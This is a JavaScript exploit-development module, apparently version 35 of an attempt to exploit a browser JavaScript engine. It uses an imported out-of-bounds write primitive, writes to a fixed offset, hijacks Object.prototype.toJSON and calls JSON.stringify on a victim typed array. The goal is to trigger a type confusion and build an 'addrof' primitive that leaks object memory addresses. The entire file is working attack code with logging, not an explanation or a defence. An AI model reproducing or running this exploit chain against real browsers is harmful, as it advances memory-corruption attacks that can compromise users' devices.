// js/script3/testArrayBufferVictimCrash.mjs (v35_FixRefErrorAndRevisitProbeReturn)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR = "OriginalHeisenbug_TypedArrayAddrof_v35_FixRefErrorRevisitProbeReturn";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v35 = null;
let object_to_leak_B_v35 = null;
let victim_typed_array_ref_v35 = null; 
let probe_call_count_v35 = 0;
let all_probe_interaction_details_v35 = []; 
const PROBE_CALL_LIMIT_V35 = 5; 


function toJSON_TA_Probe_FixRefErrorRevisitReturn() {
    probe_call_count_v35++;
    const call_num = probe_call_count_v35;
    // current_call_details é local para esta chamada.
    // Ele se tornará 'this' na próxima chamada se esta sonda o retornar e JSON.stringify o usar.
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v35_FixRefErrorRevisitReturn",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v35),
        // Checa se 'this' é o objeto current_call_details retornado pela chamada anterior da sonda
        this_is_prev_call_details_obj: (typeof this === 'object' && this !== null && 
                                      this.hasOwnProperty('probe_variant') && // Verifica uma propriedade chave de current_call_details
                                      this.probe_variant === "TA_Probe_Addrof_v35_FixRefErrorRevisitReturn" && 
                                      this.call_number === (call_num - 1)),
        leaked_A_payload_assigned: false, 
        leaked_B_payload_assigned: false,
        final_keys_of_this: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevCallDetailsObj? ${current_call_details.this_is_prev_call_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V35) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v35.push(current_call_details);
            return { recursion_stopped_v35: true, call: call_num };
        }

        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevCallDetailsObj? ${current_call_details.this_is_prev_call_details_obj})`, "vuln");
            
            // Se 'this' é o current_call_details da chamada anterior (agora confuso), escrevemos nele.
            // Ou se é um objeto genérico confuso, também escrevemos nele.
            if (object_to_leak_A_v35) {
                this.leaky_A_payload_v35 = object_to_leak_A_v35; 
                current_call_details.leaked_A_payload_assigned = true; // Indica que a propriedade foi definida NO OBJETO current_call_details ATUAL
            }
            if (object_to_leak_B_v35) {
                this.leaky_B_payload_v35 = object_to_leak_B_v35;
                current_call_details.leaked_B_payload_assigned = true;
            }
            try { current_call_details.final_keys_of_this = Object.keys(this); } catch(e){} // Chaves do 'this'
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: leaky_A/B_payload_v35 assigned to 'this'. Final 'this' keys: ${current_call_details.final_keys_of_this ? current_call_details.final_keys_of_this.join(',') : 'N/A'}`, "info");
            
            all_probe_interaction_details_v35.push(current_call_details); 
            // Retornar 'this' (que é current_call_details modificado) para encorajar o padrão da v32/v25
            return this; 
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    all_probe_interaction_details_v35.push(current_call_details);
    // Para a primeira chamada, ou se 'this' não for [object Object], retorna current_call_details.
    // Isso fará com que, na próxima chamada, 'this' seja este objeto current_call_details.
    return current_call_details; 
}

export async function executeTypedArrayVictimAddrofTest_FixRefErrorAndRevisitProbeReturn() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (FixRefErrorAndRevisitProbeReturn) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR} Init...`;

    probe_call_count_v35 = 0;
    all_probe_interaction_details_v35 = []; 
    victim_typed_array_ref_v35 = null; 
    object_to_leak_A_v35 = { marker_A_v35: "LeakMeA_FRPR", idA: Date.now() }; 
    object_to_leak_B_v35 = { marker_B_v35: "LeakMeB_FRPR", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_last_probe_call = null; 
    
    // Garantir que estas estejam definidas para o bloco finally
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_Victim_B = { success: false, msg: "VictimB: Default" }; // Adicionado para consistência
    let addrof_Output_A = { success: false, msg: "Output.leaky_A: Default"};
    let addrof_Output_B = { success: false, msg: "Output.leaky_B: Default"};

    const fillPattern = 0.35353535353535;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v35 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v35.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v35 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixRefErrorRevisitReturn, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v35); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            if (all_probe_interaction_details_v35.length > 0) {
                details_of_last_probe_call = JSON.parse(JSON.stringify(all_probe_interaction_details_v35[all_probe_interaction_details_v35.length - 1]));
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${details_of_last_probe_call ? JSON.stringify(details_of_last_probe_call) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (details_of_last_probe_call && 
                details_of_last_probe_call.this_type === "[object Object]") {
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on 'this' of LAST probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"}. Last 'this' type: ${details_of_last_probe_call ? details_of_last_probe_call.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
            if(heisenbugConfirmed) {
                 logS3(`    Details from LAST probe call (#${details_of_last_probe_call.call_number}): IsVictim? ${details_of_last_probe_call.this_is_victim}, IsPrevCallDetailsObj? ${details_of_last_probe_call.this_is_prev_call_details_obj}`, "info");
                 logS3(`    Leaky A assigned in that call? ${details_of_last_probe_call.leaked_A_payload_assigned}. Leaky B assigned? ${details_of_last_probe_call.leaked_B_payload_assigned}.`, "info");
                 logS3(`    Final keys of 'this' in that call: ${details_of_last_probe_call.final_keys_of_this ? details_of_last_probe_call.final_keys_of_this.join(',') : 'N/A'}`, "leak");
            }
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            if (float64_view_on_victim_buffer[1] !== (fillPattern + 1)) addrof_Victim_B.msg = `Victim buffer[1] CHANGED! Val: ${float64_view_on_victim_buffer[1]}`; else addrof_Victim_B.msg = `Victim buffer[1] unchanged.`;
            
            logS3("STEP 4: Checking stringifyOutput_parsed (expected to be the last 'this' confuso modificado)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                // stringifyOutput_parsed é o current_call_details da Call #1, que foi retornado
                // e então serializado. As modificações de addrof ocorreram no current_call_details da Call #2, #3 etc.
                // que também foram retornados. O stringifyOutput_parsed final deve ser o current_call_details da última chamada.
                const output_val_A = stringifyOutput_parsed.leaky_A_payload_v35;
                if (typeof output_val_A === 'number' && output_val_A !==0) {
                    let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                    if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_A.success = true; addrof_Output_A.msg = `Possible pointer from Output.leaky_A_payload_v35: ${out_A_int64.toString(true)}`;
                    } else { addrof_Output_A.msg = `Output.leaky_A_payload_v35 is num but not ptr: ${output_val_A}`; }
                } else if (output_val_A && output_val_A.marker_A_v35 === object_to_leak_A_v35.marker_A_v35) { // Checa identidade pelo marcador
                     addrof_Output_A.success = true; addrof_Output_A.msg = "object_to_leak_A_v35 identity in Output.leaky_A_payload_v35.";
                } else { addrof_Output_A.msg = `Output.leaky_A_payload_v35 not ptr or not present. Val: ${JSON.stringify(output_val_A)}`; }

                const output_val_B = stringifyOutput_parsed.leaky_B_payload_v35;
                 if (typeof output_val_B === 'number' && output_val_B !==0) {
                    let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
                    if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_B.success = true; addrof_Output_B.msg = `Possible pointer from Output.leaky_B_payload_v35: ${out_B_int64.toString(true)}`;
                    } else { addrof_Output_B.msg = `Output.leaky_B_payload_v35 is num but not ptr: ${output_val_B}`; }
                } else if (output_val_B && output_val_B.marker_B_v35 === object_to_leak_B_v35.marker_B_v35) {
                     addrof_Output_B.success = true; addrof_Output_B.msg = "object_to_leak_B_v35 identity in Output.leaky_B_payload_v35.";
                } else { addrof_Output_B.msg = `Output.leaky_B_payload_v35 not ptr or not present. Val: ${JSON.stringify(output_val_B)}`; }
            } else {
                 addrof_Output_A.msg = "stringifyOutput was not an object or was null.";
                 addrof_Output_B.msg = "stringifyOutput was not an object or was null.";
            }

            if (addrof_Output_A.success || addrof_Output_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}: AddrInOutput SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v35}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: ${addrof_Victim_B.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Output.leaky_A: Success=${addrof_Output_A.success}, Msg='${addrof_Output_A.msg}'`, addrof_Output_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output.leaky_B: Success=${addrof_Output_B.success}, Msg='${addrof_Output_B.msg}'`, addrof_Output_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v35 = null; 
        all_probe_interaction_details_v35 = []; 
        probe_call_count_v35 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_last_probe_call, 
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v35],
        total_probe_calls: probe_call_count_v35,
        addrof_A_result: addrof_Output_A, // Foco nos resultados do stringifyOutput
        addrof_B_result: addrof_Output_B
    };
}
